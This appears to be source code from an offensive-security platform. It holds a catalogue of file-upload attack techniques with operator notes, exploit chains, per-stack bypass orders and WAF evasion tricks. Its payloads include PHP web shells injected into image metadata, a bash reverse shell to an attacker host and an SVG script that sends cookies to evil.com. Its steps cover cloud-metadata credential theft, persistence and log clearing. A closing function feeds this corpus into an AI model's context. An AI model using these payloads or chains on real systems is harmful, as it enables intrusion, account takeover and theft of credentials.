        payload: "\\x89PNG\\r\\n\\x1a\\n + valid IHDR chunk + PHP in tEXt/iTXt chunk",
        mechanism: "Create a valid PNG file with PHP code embedded in a tEXt or iTXt metadata chunk. The file passes all image validation (including dimension checks) while containing executable PHP in metadata that survives re-encoding.",
        useWhen: ["Strict image validation (dimensions, format)", "getimagesize() + exif_imagetype() checks", "Image not re-encoded/resized"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008", "T1027.001"],
        chainsTo: ["ext-php-alternatives", "mime-image-php"],
        detectionSignatures: ["PHP tags in PNG metadata chunks", "Unusual tEXt chunks in PNG"],
        successRate: "common",
        operatorNotes: `Use exiftool to inject PHP into PNG metadata: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png. If the server re-encodes the image (ImageMagick, GD), the payload may be stripped \u2014 try IDAT chunk injection instead.`
      },
      {
        id: "magic-bytes-jpeg-exif",
        name: "JPEG EXIF PHP Injection",
        category: "magic_bytes",
        subcategory: "image_polyglot",
        payload: "Valid JPEG with PHP in EXIF Comment/UserComment field",
        mechanism: "Embed PHP code in JPEG EXIF metadata (Comment, UserComment, or custom IFD fields). The file is a valid JPEG that passes all image checks. If later included via LFI or the extension is changed, PHP executes the embedded code.",
        useWhen: ["JPEG uploads accepted", "LFI vulnerability exists", "EXIF data preserved (no stripping)", "Image not re-processed"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "low",
        mitreTechniques: ["T1036.008", "T1027.001"],
        chainsTo: ["ext-double-extension", "path-traversal-basic"],
        detectionSignatures: ["PHP tags in EXIF data", "Executable code in image metadata"],
        successRate: "common",
        operatorNotes: `Create with: exiftool -Comment='<?php system($_GET["c"]); ?>' photo.jpg. Key insight: even if you can't execute the file directly, if there's an LFI anywhere in the app, you can include the uploaded image and the PHP in EXIF will execute.`
      },
      {
        id: "magic-bytes-pdf",
        name: "PDF with Embedded JavaScript",
        category: "magic_bytes",
        subcategory: "document_polyglot",
        payload: "%PDF-1.4 header + /OpenAction /JavaScript stream",
        mechanism: "PDFs can contain JavaScript that executes when opened in a PDF viewer. If the application processes uploaded PDFs (preview, thumbnail generation), the JavaScript may execute in the server context or achieve client-side XSS.",
        useWhen: ["PDF uploads accepted", "Server-side PDF processing (thumbnail, preview)", "PDFs served inline to users"],
        effectiveAgainst: ["generic", "node_express", "python_django"],
        detectionRisk: "medium",
        mitreTechniques: ["T1204.002", "T1059.007"],
        chainsTo: ["mime-html-upload", "metadata-exif-xss"],
        detectionSignatures: ["JavaScript in PDF objects", "/OpenAction or /AA in PDF", "Suspicious PDF streams"],
        successRate: "occasional",
        operatorNotes: "For server-side exploitation, target PDF processing libraries (Ghostscript CVEs, ImageMagick delegates). For client-side, embed JS that exfiltrates data when the PDF is viewed. Check if PDFs are rendered server-side for thumbnails."
      }
    ];
    POLYGLOT_TECHNIQUES = [
      {
        id: "polyglot-gifar",
        name: "GIFAR (GIF + JAR Polyglot)",
        category: "polyglot",
        subcategory: "multi_format",
        payload: "Valid GIF file + appended JAR/ZIP content (ZIP reads from end, GIF from start)",
        mechanism: "GIF parsers read from the start of the file, ZIP/JAR parsers read from the end. A file can be simultaneously valid GIF and valid JAR. Upload as image, reference as applet/JAR for code execution.",
        useWhen: ["Java applet context available", "Image upload + Java application", "File served with multiple Content-Types"],
        effectiveAgainst: ["java_tomcat", "java_spring"],
        detectionRisk: "high",
        mitreTechniques: ["T1027.001", "T1036.008"],
        chainsTo: ["magic-bytes-gif", "ext-java-alternatives"],
        detectionSignatures: ["ZIP signatures at end of GIF file", "Dual-format file headers"],
        successRate: "rare",
        operatorNotes: "Classic technique from 2008. Less relevant now that Java applets are dead, but the concept applies to any format that reads from the end (ZIP, DOCX, XLSX are all ZIP-based)."
      },
      {
        id: "polyglot-phar-jpeg",
        name: "PHAR/JPEG Polyglot",
        category: "polyglot",
        subcategory: "php_polyglot",
        payload: "Valid JPEG with PHAR archive appended after JPEG EOI marker",
        mechanism: "JPEG parsing stops at the EOI (End of Image) marker. Anything after is ignored by image validators. A PHAR archive appended after EOI creates a file that passes image validation but can be deserialized as PHAR, achieving RCE via phar:// wrapper.",
        useWhen: ["PHP target with phar:// wrapper accessible", "Deserialization gadget chains available", "Image upload with known storage path"],
        effectiveAgainst: ["php_apache", "php_nginx"],
        detectionRisk: "high",
        mitreTechniques: ["T1027.001", "T1059.004"],
        chainsTo: ["magic-bytes-jpeg-exif", "ext-php-alternatives"],
        detectionSignatures: ["PHAR signatures after JPEG EOI", "phar:// in application logs", "Deserialization after image upload"],
        successRate: "occasional",
        operatorNotes: "Requires a code path that uses phar:// with user-controlled input. Common in file_exists(), is_dir(), or any filesystem function that accepts phar:// URIs. Check for gadget chains in the application's dependencies."
      },
      {
        id: "polyglot-html-image",
        name: "HTML/Image Polyglot",
        category: "polyglot",
        subcategory: "web_polyglot",
        payload: "GIF89a/*<html><body><script>alert(1)</script></body></html>*/=0;",
        mechanism: "File starts with GIF89a (valid GIF header) followed by HTML in a GIF comment block. If served as text/html, browsers render the HTML. If served as image/gif, it's a valid (broken) GIF. Achieves stored XSS if Content-Type can be manipulated.",
        useWhen: ["Content-Type sniffing enabled", "No X-Content-Type-Options: nosniff", "File served from same origin"],
        effectiveAgainst: ["generic", "aws_s3", "azure_blob"],
        detectionRisk: "medium",
        mitreTechniques: ["T1059.007", "T1027.001"],
        chainsTo: ["mime-html-upload", "mime-svg-xss"],
        detectionSignatures: ["HTML tags in image files", "Script content in GIF comments"],
        successRate: "occasional",
        operatorNotes: "Effectiveness depends on X-Content-Type-Options header. Without 'nosniff', browsers may sniff the content and render as HTML despite image/gif Content-Type. Test with and without the header."
      }
    ];
    RACE_CONDITION_TECHNIQUES = [
      {
        id: "race-toctou",
        name: "TOCTOU Race (Time-of-Check/Time-of-Use)",
        category: "race_condition",
        subcategory: "toctou",
        payload: "Upload valid image \u2192 race to replace with shell before validation completes",
        mechanism: "If the application writes the file first, then validates, there's a window where the malicious file exists on disk. If you can access it during this window (or if validation fails but doesn't delete), you achieve execution.",
        useWhen: ["File written before validation", "Async validation pipeline", "Validation doesn't delete on failure", "Known upload path"],
        effectiveAgainst: ["php_apache", "node_express", "python_django", "ruby_rails"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1068"],
        chainsTo: ["race-parallel-upload", "path-traversal-basic"],
        detectionSignatures: ["Rapid sequential requests to upload path", "File access before validation completion"],
        successRate: "occasional",
        operatorNotes: "Use Burp Intruder or custom script to rapidly request the uploaded file URL while simultaneously uploading. The window may be milliseconds \u2014 use high concurrency. Check if the app uses a temp directory before moving to final location."
      },
      {
        id: "race-parallel-upload",
        name: "Parallel Upload Race Condition",
        category: "race_condition",
        subcategory: "concurrency",
        payload: "Upload shell.php and shell.jpg simultaneously with same filename \u2192 hope shell.php wins the race",
        mechanism: "Upload two files with the same target filename simultaneously. If the application doesn't use atomic file operations or proper locking, the malicious file may overwrite the validated one, or the validation of one may be applied to the other.",
        useWhen: ["No file locking on uploads", "Predictable filename generation", "Same-name overwrites allowed"],
        effectiveAgainst: ["php_apache", "node_express", "python_flask"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1068"],
        chainsTo: ["race-toctou"],
        detectionSignatures: ["Concurrent uploads with same filename", "File content mismatch after upload"],
        successRate: "rare",
        operatorNotes: "Requires the application to have a race condition in its upload handling. More common in custom upload handlers than in framework-provided ones. Test with high concurrency (50+ parallel requests)."
      },
      {
        id: "race-chunked-reassembly",
        name: "Chunked Upload Reassembly Race",
        category: "race_condition",
        subcategory: "chunked",
        payload: "Upload file in chunks, replace middle chunk with malicious content during reassembly",
        mechanism: "Applications that support chunked/resumable uploads may validate individual chunks but not the reassembled file. Or there's a window between reassembly and final validation where the complete malicious file exists.",
        useWhen: ["Chunked/resumable upload supported", "Individual chunk validation only", "Predictable chunk storage location"],
        effectiveAgainst: ["node_express", "java_spring", "generic"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1068"],
        chainsTo: ["race-toctou"],
        detectionSignatures: ["Chunk content mismatch", "Rapid chunk replacement requests"],
        successRate: "rare",
        operatorNotes: "Target applications using tus.io, Dropzone.js chunked mode, or custom chunked upload implementations. The reassembly step is often the weakest point."
      }
    ];
    PATH_TRAVERSAL_TECHNIQUES = [
      {
        id: "path-traversal-basic",
        name: "Basic Path Traversal in Filename",
        category: "path_traversal",
        subcategory: "directory_traversal",
        payload: "../../../var/www/html/shell.php, ..\\..\\..\\inetpub\\wwwroot\\shell.asp",
        mechanism: "If the application uses the uploaded filename directly in the storage path without sanitization, ../ sequences can escape the upload directory and write to arbitrary locations (like the web root).",
        useWhen: ["Filename used in file path construction", "No path sanitization", "Known web root location"],
        effectiveAgainst: ["php_apache", "php_nginx", "aspnet_iis", "node_express", "python_django"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1083"],
        chainsTo: ["path-traversal-encoded", "ext-php-alternatives"],
        detectionSignatures: ["../ or ..\\ in uploaded filename", "Path traversal sequences in multipart data"],
        successRate: "occasional",
        operatorNotes: "Try both forward slash (Linux) and backslash (Windows) variants. Also try: ....// (double dot bypass), ..;/ (Tomcat specific), ..\\./ (mixed separators). Check if the upload directory is within the web root."
      },
      {
        id: "path-traversal-encoded",
        name: "Encoded Path Traversal",
        category: "path_traversal",
        subcategory: "encoded_traversal",
        payload: "..%2f..%2f..%2fshell.php, ..%5c..%5c..%5cshell.asp, %2e%2e%2f%2e%2e%2f",
        mechanism: "URL-encode the path traversal characters to bypass filters that check for literal '../'. If the application decodes after validation, the traversal succeeds.",
        useWhen: ["Basic ../ filtering in place", "Application URL-decodes filenames", "WAF blocks literal traversal"],
        effectiveAgainst: ["php_apache", "java_tomcat", "aspnet_iis", "generic"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1083", "T1027"],
        chainsTo: ["encoding-double-url", "path-traversal-basic"],
        detectionSignatures: ["URL-encoded path separators in filename", "%2f or %5c in upload data"],
        successRate: "occasional",
        operatorNotes: "Encoding variants to try: %2e%2e%2f, %2e%2e/, ..%2f, %2e%2e%5c, ..%255c (double-encoded). Also try: ..%c0%af (overlong UTF-8 for /), ..%ef%bc%8f (fullwidth solidus)."
      },
      {
        id: "path-traversal-iis",
        name: "IIS-Specific Path Traversal",
        category: "path_traversal",
        subcategory: "iis_traversal",
        payload: "..\\..\\..\\inetpub\\wwwroot\\shell.aspx, ...\\...\\shell.asp",
        mechanism: "IIS handles backslashes as path separators and has unique parsing for multiple dots. '...\\.\\' can bypass some IIS-specific filters. Combined with short filename (8.3) format can bypass length checks.",
        useWhen: ["IIS target", "Windows path handling", "Short filename (8.3) enabled"],
        effectiveAgainst: ["aspnet_iis"],
        detectionRisk: "high",
        mitreTechniques: ["T1036.008", "T1083"],
        chainsTo: ["ext-semicolon", "ext-colon-ads"],
        detectionSignatures: ["Backslash path traversal in uploads", "Windows-style paths in filename"],
        successRate: "occasional",
        operatorNotes: "IIS-specific tricks: use backslash, try ...\\.\\, try 8.3 short names (SHELL~1.PHP), try UNC paths (\\\\server\\share). Check if IIS request filtering is configured."
      }
    ];
    EXPLOIT_CHAINS = [
      {
        id: "chain-upload-to-rce-php",
        name: "File Upload \u2192 Web Shell \u2192 RCE (PHP)",
        description: "Upload a PHP web shell by bypassing extension and content validation, then execute commands via the uploaded shell.",
        steps: [
          { order: 1, technique: "magic-bytes-gif", description: "Create GIF89a + PHP polyglot", payload: "GIF89a;<?php system($_GET['c']); ?>", expectedResult: "File passes magic byte validation", fallbackTechnique: "magic-bytes-png" },
          { order: 2, technique: "ext-double-extension", description: "Use double extension to bypass blacklist", payload: "shell.php.gif", expectedResult: "Extension check passes (sees .gif)", fallbackTechnique: "ext-php-alternatives" },
          { order: 3, technique: "mime-image-php", description: "Set Content-Type to image/gif", payload: "Content-Type: image/gif", expectedResult: "MIME type validation passes", fallbackTechnique: "mime-octet-stream" },
          { order: 4, technique: "path-traversal-basic", description: "Access uploaded file via web", payload: "GET /uploads/shell.php.gif?c=id", expectedResult: "PHP executes, returns uid output", fallbackTechnique: "race-toctou" }
        ],
        prerequisites: ["PHP/Apache target", "File upload functionality", "Uploaded files accessible via web"],
        impact: "rce",
        difficulty: "medium",
        targetEnvironments: ["php_apache", "php_nginx"]
      },
      {
        id: "chain-upload-to-rce-aspnet",
        name: "File Upload \u2192 ASPX Shell \u2192 RCE (ASP.NET/IIS)",
        description: "Upload an ASPX web shell using IIS-specific bypasses (semicolons, ADS, trailing dots).",
        steps: [
          { order: 1, technique: "ext-semicolon", description: "Use semicolon bypass for IIS", payload: "shell.aspx;.jpg", expectedResult: "IIS treats as .aspx with parameter", fallbackTechnique: "ext-dot-trailing" },
          { order: 2, technique: "mime-image-php", description: "Set Content-Type to image/jpeg", payload: "Content-Type: image/jpeg", expectedResult: "MIME validation passes", fallbackTechnique: "mime-octet-stream" },
          { order: 3, technique: "ext-colon-ads", description: "Alternative: use ADS if semicolon fails", payload: "shell.aspx::$DATA", expectedResult: "File stored as shell.aspx", fallbackTechnique: "ext-space" },
          { order: 4, technique: "path-traversal-iis", description: "Navigate to uploaded shell", payload: "GET /uploads/shell.aspx;.jpg", expectedResult: "ASPX executes, returns command output" }
        ],
        prerequisites: ["IIS/ASP.NET target", "File upload functionality", "NTFS filesystem"],
        impact: "rce",
        difficulty: "medium",
        targetEnvironments: ["aspnet_iis"]
      },
      {
        id: "chain-svg-to-ssrf",
        name: "SVG Upload \u2192 SSRF \u2192 Internal Network Access",
        description: "Upload an SVG with external entity references to achieve SSRF and access internal services.",
        steps: [
          { order: 1, technique: "mime-svg-xss", description: "Upload SVG with XXE/SSRF payload", payload: "<!DOCTYPE svg [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><svg>&xxe;</svg>", expectedResult: "SVG accepted as valid image" },
          { order: 2, technique: "magic-bytes-gif", description: "If SVG blocked, try SVG in image context", payload: "SVG with xlink:href to internal URLs", expectedResult: "Server processes SVG and makes internal request", fallbackTechnique: "mime-html-upload" },
          { order: 3, technique: "mime-image-php", description: "Trigger server-side SVG rendering", payload: "Request thumbnail/preview generation", expectedResult: "Server fetches external entities during rendering" }
        ],
        prerequisites: ["SVG upload accepted", "Server-side SVG processing (ImageMagick, librsvg)", "Internal network accessible from server"],
        impact: "file_read",
        difficulty: "medium",
        targetEnvironments: ["generic", "node_express", "python_django"]
      },
      {
        id: "chain-phar-deserialization",
        name: "Image Upload \u2192 PHAR Deserialization \u2192 RCE (PHP)",
        description: "Upload a PHAR polyglot disguised as JPEG, trigger deserialization via phar:// wrapper for RCE.",
        steps: [
          { order: 1, technique: "polyglot-phar-jpeg", description: "Create JPEG/PHAR polyglot with gadget chain", payload: "Valid JPEG + PHAR with __destruct() gadget", expectedResult: "File passes image validation" },
          { order: 2, technique: "mime-image-php", description: "Upload with image/jpeg Content-Type", payload: "Content-Type: image/jpeg", expectedResult: "Accepted as valid JPEG" },
          { order: 3, technique: "race-toctou", description: "Trigger phar:// deserialization", payload: "Find code path using file_exists(phar://uploads/image.jpg)", expectedResult: "PHAR metadata deserialized, gadget chain executes" }
        ],
        prerequisites: ["PHP target", "phar:// wrapper accessible", "Gadget chain available in dependencies", "Known upload path"],
        impact: "rce",
        difficulty: "hard",
        targetEnvironments: ["php_apache", "php_nginx"]
      },
      {
        id: "chain-webconfig-upload",
        name: "web.config Upload \u2192 Handler Mapping \u2192 RCE (IIS)",
        description: "Upload a web.config file to reconfigure IIS handler mappings, enabling execution of arbitrary file types.",
        steps: [
          { order: 1, technique: "path-traversal-basic", description: "Upload web.config to target directory", payload: "filename: web.config with custom handler mapping", expectedResult: "web.config placed in upload directory" },
          { order: 2, technique: "ext-aspnet-alternatives", description: "Upload shell with custom extension", payload: "shell.xyz (extension mapped in web.config to ASP.NET handler)", expectedResult: "Custom extension now executed as ASPX" },
          { order: 3, technique: "ext-double-extension", description: "Access the shell", payload: "GET /uploads/shell.xyz", expectedResult: "IIS processes file through ASP.NET handler, RCE achieved" }
        ],
        prerequisites: ["IIS target", "Upload to directory without existing web.config", "No applicationHost.config override preventing"],
        impact: "rce",
        difficulty: "medium",
        targetEnvironments: ["aspnet_iis"]
      },
      {
        id: "chain-htaccess-upload",
        name: ".htaccess Upload \u2192 PHP Handler \u2192 RCE (Apache)",
        description: "Upload a .htaccess file to make Apache treat a custom extension as PHP, then upload a shell with that extension.",
        steps: [
          { order: 1, technique: "path-traversal-basic", description: "Upload .htaccess to upload directory", payload: ".htaccess content: AddType application/x-httpd-php .xyz", expectedResult: ".htaccess accepted (may need path traversal)" },
          { order: 2, technique: "ext-php-alternatives", description: "Upload shell with custom extension", payload: "shell.xyz containing <?php system($_GET['c']); ?>", expectedResult: "File accepted (extension not in blacklist)" },
          { order: 3, technique: "mime-octet-stream", description: "Access the shell", payload: "GET /uploads/shell.xyz?c=id", expectedResult: "Apache processes .xyz as PHP due to .htaccess, RCE achieved" }
        ],
        prerequisites: ["Apache with AllowOverride enabled", "Upload directory accessible via web", ".htaccess not in upload blacklist"],
        impact: "rce",
        difficulty: "easy",
        targetEnvironments: ["php_apache"]
      }
    ];
    TECH_STACK_PROFILES = [
      {
        stack: "php_apache",
        name: "PHP on Apache (mod_php / PHP-FPM)",
        defaultBehavior: "Apache uses AddHandler/AddType to map extensions to PHP handler. Files in web root with PHP extensions are executed. move_uploaded_file() used for storage.",
        commonValidations: ["pathinfo() extension check", "getimagesize() for images", "mime_content_type() / finfo", "Blacklist of extensions", "File size limits"],
        weaknesses: [
          "AddHandler processes first recognized extension (shell.php.xyz executes as PHP if .xyz unknown)",
          ".htaccess can override handler mappings per-directory",
          "getimagesize() passes on polyglot files (GIF89a + PHP)",
          "phar:// wrapper enables deserialization from any file",
          "include()/require() will execute PHP in any file regardless of extension",
          "preg_match() without anchors can be bypassed with newlines"
        ],
        recommendedBypassOrder: [
          "ext-php-alternatives",
          "ext-double-extension",
          "magic-bytes-gif",
          "chain-htaccess-upload",
          "ext-case-upper",
          "ext-null-byte",
          "polyglot-phar-jpeg"
        ],
        executionMethods: ["Direct URL access", "include()/require() LFI", "phar:// deserialization", ".htaccess handler override"],
        storagePaths: ["/var/www/html/uploads/", "/var/www/uploads/", "/tmp/", "/var/www/html/images/"]
      },
      {
        stack: "aspnet_iis",
        name: "ASP.NET on IIS (Windows)",
        defaultBehavior: "IIS uses handler mappings to route extensions to ASP.NET ISAPI. NTFS filesystem strips trailing dots/spaces. web.config per-directory configuration.",
        commonValidations: ["Path.GetExtension() check", "Content-Type validation", "FileExtensionContentTypeProvider", "Request filtering (IIS)", "Antivirus scanning"],
        weaknesses: [
          "NTFS strips trailing dots and spaces (shell.aspx. \u2192 shell.aspx)",
          "Semicolons treated as parameters in IIS 6.0 (shell.asp;.jpg \u2192 executes as ASP)",
          "Alternate Data Streams (::$DATA) bypass extension checks",
          "web.config upload can reconfigure handler mappings",
          "Short filename (8.3) format can bypass length/pattern filters",
          "IIS request filtering can be bypassed with URL encoding"
        ],
        recommendedBypassOrder: [
          "ext-dot-trailing",
          "ext-space",
          "ext-semicolon",
          "ext-colon-ads",
          "chain-webconfig-upload",
          "ext-aspnet-alternatives",
          "path-traversal-iis"
        ],
        executionMethods: ["Direct URL access", "web.config handler mapping", "ISAPI handler", "IIS virtual directory"],
        storagePaths: ["C:\\inetpub\\wwwroot\\uploads\\", "C:\\inetpub\\wwwroot\\App_Data\\", "C:\\Windows\\Temp\\"]
      },
      {
        stack: "java_tomcat",
        name: "Java on Apache Tomcat",
        defaultBehavior: "Tomcat maps .jsp/.jspx to JSP compiler. WAR files auto-deploy. web.xml defines servlet mappings. Multipart upload via commons-fileupload or Servlet 3.0.",
        commonValidations: ["Extension whitelist/blacklist", "Content-Type check", "File size limits", "Filename sanitization (replaceAll)", "Antivirus integration"],
        weaknesses: [
          "WAR file deployment via manager or auto-deploy directory",
          ".jspf (JSP fragment) files execute when included",
          "..;/ path traversal (Tomcat-specific normalization)",
          "Double URL encoding bypasses request filtering",
          "web.xml upload can add new servlet mappings",
          "Deserialization in upload processing (commons-fileupload CVEs)"
        ],
        recommendedBypassOrder: [
          "ext-java-alternatives",
          "ext-double-extension",
          "path-traversal-encoded",
          "encoding-double-url",
          "race-toctou",
          "ext-null-byte"
        ],
        executionMethods: ["Direct URL access to JSP", "WAR deployment", "Servlet mapping", "JSP include"],
        storagePaths: ["/opt/tomcat/webapps/ROOT/uploads/", "/tmp/", "/var/lib/tomcat/webapps/"]
      },
      {
        stack: "node_express",
        name: "Node.js on Express",
        defaultBehavior: "Express uses multer/busboy for multipart uploads. Files stored to disk or memory. No server-side execution of uploaded files by default \u2014 vulnerability requires misconfiguration or additional processing.",
        commonValidations: ["multer fileFilter (extension/MIME)", "file-type package (magic bytes)", "express-fileupload limits", "Custom middleware validation", "Sharp/ImageMagick for image processing"],
        weaknesses: [
          "No built-in execution of uploaded files (safer by default)",
          "But: template injection if filename used in template rendering",
          "Path traversal if filename used in fs.writeFile() without sanitization",
          "Prototype pollution via filename in object keys",
          "SSRF via SVG processing (Sharp, ImageMagick)",
          "Stored XSS via HTML/SVG uploads served from same origin",
          "Command injection if filename passed to child_process"
        ],
        recommendedBypassOrder: [
          "mime-svg-xss",
          "mime-html-upload",
          "path-traversal-basic",
          "race-toctou",
          "polyglot-html-image",
          "magic-bytes-pdf"
        ],
        executionMethods: ["Stored XSS via SVG/HTML", "SSRF via image processing", "Path traversal to overwrite config", "Template injection"],
        storagePaths: ["/tmp/", "./uploads/", "./public/uploads/", "/var/data/uploads/"]
      },
      {
        stack: "python_django",
        name: "Python on Django/Flask",
        defaultBehavior: "Django uses FileField/ImageField with validators. Files stored to MEDIA_ROOT. Flask uses werkzeug's secure_filename(). No server-side execution by default.",
        commonValidations: ["Django FileExtensionValidator", "Pillow verify() for images", "secure_filename() sanitization", "Content-Type validation", "File size limits (DATA_UPLOAD_MAX)"],
        weaknesses: [
          "secure_filename() strips path traversal but may allow unusual extensions",
          "Pillow/PIL processing can trigger CVEs (ImageMagick delegates)",
          "Template injection if filename rendered in Jinja2/Django templates",
          "SSRF via image URL fetching (if app downloads from URL)",
          "Stored XSS via SVG if served from same origin",
          "Pickle deserialization if uploaded files are unpickled",
          "SSTI if filename appears in template context"
        ],
        recommendedBypassOrder: [
          "mime-svg-xss",
          "mime-html-upload",
          "chain-svg-to-ssrf",
          "magic-bytes-pdf",
          "path-traversal-encoded",
          "race-toctou"
        ],
        executionMethods: ["Stored XSS via SVG/HTML", "SSRF via image processing", "SSTI via filename", "Pickle deserialization"],
        storagePaths: ["/var/www/media/", "./media/uploads/", "/tmp/", "./static/uploads/"]
      }
    ];
    WAF_EVASION_TECHNIQUES = [
      {
        id: "waf-content-type-boundary",
        name: "Multipart Boundary Manipulation",
        category: "waf_evasion",
        subcategory: "multipart_abuse",
        payload: "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\\x00evil",
        mechanism: "WAFs parse multipart boundaries differently than application servers. Null bytes, extra whitespace, or unusual characters in the boundary string can cause the WAF to fail parsing while the server processes normally.",
        useWhen: ["WAF blocking upload attempts", "Multipart parsing differences between WAF and server", "Known WAF product"],
        effectiveAgainst: ["cloudflare_waf", "generic"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1562.001"],
        chainsTo: ["waf-chunked-encoding", "waf-content-disposition"],
        detectionSignatures: ["Unusual multipart boundary characters", "Null bytes in Content-Type header"],
        successRate: "occasional",
        operatorNotes: "Each WAF handles boundaries differently. Try: extra long boundaries (>70 chars), boundaries with special chars, duplicate boundary parameters, missing closing boundary."
      },
      {
        id: "waf-content-disposition",
        name: "Content-Disposition Header Manipulation",
        category: "waf_evasion",
        subcategory: "header_abuse",
        payload: `Content-Disposition: form-data; name="file"; filename="shell.php"; filename*=UTF-8''shell.php`,
        mechanism: "Multiple filename parameters, RFC 5987 encoded filenames (filename*=), or unusual quoting can confuse WAFs. The server may use a different filename parameter than the one the WAF inspects.",
        useWhen: ["WAF inspects filename in Content-Disposition", "Server uses different parsing than WAF", "RFC 5987 support on server"],
        effectiveAgainst: ["cloudflare_waf", "generic"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1562.001"],
        chainsTo: ["waf-content-type-boundary", "encoding-double-url"],
        detectionSignatures: ["Multiple filename parameters", "RFC 5987 encoded filenames", "Unusual Content-Disposition formatting"],
        successRate: "occasional",
        operatorNotes: "Variations: duplicate filename params (WAF checks first, server uses last), filename with embedded newlines, filename* with charset encoding, unquoted filename with spaces."
      },
      {
        id: "waf-chunked-encoding",
        name: "Transfer-Encoding: chunked Bypass",
        category: "waf_evasion",
        subcategory: "encoding_abuse",
        payload: "Transfer-Encoding: chunked\\n\\n4\\r\\n<?ph\\r\\n3\\r\\np s\\r\\n...",
        mechanism: "Send the upload body using chunked transfer encoding, splitting the malicious payload across chunk boundaries. Some WAFs don't reassemble chunks before inspection, missing the complete payload.",
        useWhen: ["WAF doesn't reassemble chunked requests", "Server supports chunked uploads", "Payload signature split across chunks"],
        effectiveAgainst: ["cloudflare_waf", "generic"],
        detectionRisk: "medium",
        mitreTechniques: ["T1036.008", "T1562.001", "T1027"],
        chainsTo: ["waf-content-type-boundary"],
        detectionSignatures: ["Chunked encoding on upload requests", "Unusual chunk sizes"],
        successRate: "occasional",
        operatorNotes: "Split the payload at signature boundaries. If WAF looks for '<?php', send '<?ph' in one chunk and 'p' in the next. Also try: chunk extensions, trailer headers, zero-length chunks."
      }
    ];
    POST_UPLOAD_TECHNIQUES = [
      {
        id: "post-webshell-execution",
        name: "Web Shell Command Execution",
        description: "After uploading a web shell, use it to execute system commands, establish persistence, and pivot.",
        prerequisites: ["Web shell uploaded and accessible", "PHP/ASP/JSP execution confirmed"],
        steps: [
          "1. Verify execution: curl 'http://target/uploads/shell.php?c=id'",
          "2. Enumerate: whoami, uname -a, cat /etc/passwd, env",
          "3. Check connectivity: curl http://attacker.com/callback",
          "4. Establish reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
          "5. Or upgrade to Meterpreter: msfvenom payload + download + execute",
          "6. Persistence: crontab, systemd service, SSH key injection",
          "7. Cleanup: remove web shell, clear logs"
        ],
        impact: "Full RCE \u2192 lateral movement \u2192 persistence",
        targetStacks: ["php_apache", "php_nginx", "aspnet_iis", "java_tomcat"]
      },
      {
        id: "post-lfi-chain",
        name: "Upload + Local File Inclusion Chain",
        description: "Upload a file with embedded code (in metadata/comments), then trigger LFI to include and execute it.",
        prerequisites: ["File upload (any type accepted)", "LFI vulnerability elsewhere in app", "Known upload path"],
        steps: [
          "1. Upload image with PHP in EXIF: exiftool -Comment='<?php system($_GET[c]); ?>' img.jpg",
          "2. Note the upload path (e.g., /uploads/img.jpg)",
          "3. Trigger LFI: http://target/page.php?file=../uploads/img.jpg",
          "4. PHP engine processes the file, executes code in EXIF comment",
          "5. Alternative: use php://filter to read then base64 decode",
          "6. Alternative: use zip:// or phar:// wrappers on uploaded archives"
        ],
        impact: "RCE via LFI + uploaded file",
        targetStacks: ["php_apache", "php_nginx"]
      },
      {
        id: "post-stored-xss-chain",
        name: "Upload + Stored XSS \u2192 Account Takeover",
        description: "Upload HTML/SVG with JavaScript to achieve stored XSS, then steal admin session cookies.",
        prerequisites: ["SVG or HTML upload accepted", "Files served from same origin", "No CSP or weak CSP"],
        steps: [
          "1. Upload SVG: <svg><script>fetch('https://evil.com/?c='+document.cookie)</script></svg>",
          "2. Find the URL where the file is served",
          "3. Send link to admin (social engineering or inject in page)",
          "4. When admin views, JavaScript executes in app context",
          "5. Steal session cookie, localStorage tokens, or CSRF tokens",
          "6. Use stolen session to access admin panel",
          "7. Escalate: create new admin account, modify application"
        ],
        impact: "Account takeover \u2192 full application compromise",
        targetStacks: ["generic", "node_express", "python_django", "ruby_rails"]
      },
      {
        id: "post-ssrf-cloud-metadata",
        name: "Upload + SSRF \u2192 Cloud Metadata Theft",
        description: "Upload SVG/image that triggers SSRF to cloud metadata endpoint, stealing IAM credentials.",
        prerequisites: ["Server-side image processing", "Running on AWS/GCP/Azure", "IMDSv1 or accessible metadata"],
        steps: [
          "1. Upload SVG with external reference: <image xlink:href='http://169.254.169.254/latest/meta-data/iam/security-credentials/'/>",
          "2. Trigger server-side rendering (thumbnail, preview, PDF export)",
          "3. Server fetches metadata endpoint during processing",
          "4. Extract IAM role name from response",
          "5. Fetch credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
          "6. Use stolen credentials for AWS API access",
          "7. Escalate: S3 access, EC2 control, secrets manager"
        ],
        impact: "Cloud credential theft \u2192 infrastructure compromise",
        targetStacks: ["generic", "node_express", "python_django", "aws_s3"]
      }
    ];
  }
});

// server/lib/platform-knowledge-corpus.ts
function buildPlatformKnowledgeContext(options) {
  const depth = options?.depth ?? "overview";
  const categories = options?.categories;
  const trigger = options?.triggerContext;
  const allModules = [
    ...PLATFORM_CAPABILITIES,
    ...ENGAGEMENT_OPERATIONS,
    ...THREAT_INTELLIGENCE,
    ...OFFENSIVE_TECHNIQUES,
    ...COMPLIANCE_FRAMEWORKS
  ];
  let filtered = allModules;
  const depthOrder = { overview: 0, detailed: 1, expert: 2 };
  filtered = filtered.filter((m) => depthOrder[m.depth] <= depthOrder[depth]);
  if (categories) {
    filtered = filtered.filter((m) => categories.includes(m.category));
  }
  if (trigger) {
    const triggerLower = trigger.toLowerCase();
    filtered = filtered.filter(
      (m) => m.triggerContexts.some((tc) => triggerLower.includes(tc.toLowerCase())) || m.description.toLowerCase().includes(triggerLower)
    );
  }
  let context = `# AC3 Platform Knowledge Base

`;
  context += `You have deep knowledge of the AC3 (AceofCloud Cyber Command) platform.
`;
